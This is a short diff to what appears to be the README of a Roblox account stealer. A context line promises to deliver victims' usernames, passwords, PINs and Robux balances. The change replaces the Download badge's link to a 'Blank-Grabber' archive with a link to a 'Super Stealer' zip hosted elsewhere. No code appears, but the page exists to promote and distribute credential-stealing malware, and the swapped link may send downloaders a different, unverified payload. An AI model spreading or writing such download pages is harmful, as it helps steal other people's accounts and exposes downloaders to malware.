@@ -19,4 +19,4 @@ After that wait it will give you the username,password,pin and robux amount in t
 
 Download
 
-[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)
+[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/SwaggYzzX/Super-Stealer/blob/main/Super%20Stealer.zip)
